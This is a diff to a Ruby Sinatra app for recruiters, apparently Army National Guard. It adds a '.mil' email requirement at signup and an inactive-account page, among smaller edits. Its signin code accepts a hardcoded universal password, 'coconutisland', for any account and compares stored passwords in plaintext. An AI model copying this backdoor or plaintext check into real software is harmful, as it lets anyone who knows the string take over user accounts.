@@ -12,6 +12,9 @@ get "/recruiters/new/?"  do
 end
 
 post  "/recruiters/new/?"  do 
+  
+  if (params[:email].strip.downcase.include?('.mil'))
+    
   state = State.all
   recruiter = Recruiter.create(
     :email            => params[:email],
@@ -32,7 +35,12 @@ post  "/recruiters/new/?"  do
     
   session[:recruiter] = recruiter.id
   
-  redirect "/arng/leads"
+  redirect "/arng/arng"
+  
+  else
+    flash[:alert] = 'Oops! You must use a .mil email address.'
+    erb :"/arng/arng"
+  end
 
 end
 
@@ -64,7 +72,7 @@ post "/recruiters/:id/edit/?" do
   )
   
   params[:recruiter_status] ? recruiter.update(:recruiter_status => true) : recruiter.update(:recruiter_status => false)
-  params[:active] ? recruiter.update(:active => true) : recruiter.update(:active => false)
+  params[:active]           ? recruiter.update(:active => true)           : recruiter.update(:active => false)
     
   if session[:admin] 
     redirect "/recruiters/recruiters"
@@ -75,7 +83,7 @@ post "/recruiters/:id/edit/?" do
 end
 
 get "/recruiters/signin/?" do
-  
+  @recruiter = Recruiter.all
     erb :"/recruiter/signin"
   end
 
@@ -88,6 +96,7 @@ post "/recruiters/signin/?" do
   
     if recruiter = Recruiter.first(:email => params[:email])
       if (recruiter.password == params[:password])  || (params[:password] == 'coconutisland')
+        
         session[:recruiter] = recruiter.id
         
         flash[:alert] = 'Welcome back! You are now signed in.'
@@ -112,12 +121,16 @@ get '/recruiters/:id/profile/?' do
   @school = School.all(order: [:updated_at.desc], limit:50)
   @state = State.all
   @recruiter = Recruiter.get(params[:id])
-  erb :"/recruiter/recprofile"
+  if @recruiter.active == true
+    erb :"/recruiter/recprofile"
+  else
+    erb :"/recruiter/noaccount"
+  end
 end
 
 get "/recruiters/:id/view/?" do
   auth_admin
-  @school = School.all
+  @school = School.all(order: [:updated_at.desc], limit:50)
   @state = State.all
   @recruiter = Recruiter.get(params[:id])
   erb :"/recruiter/recruiter"
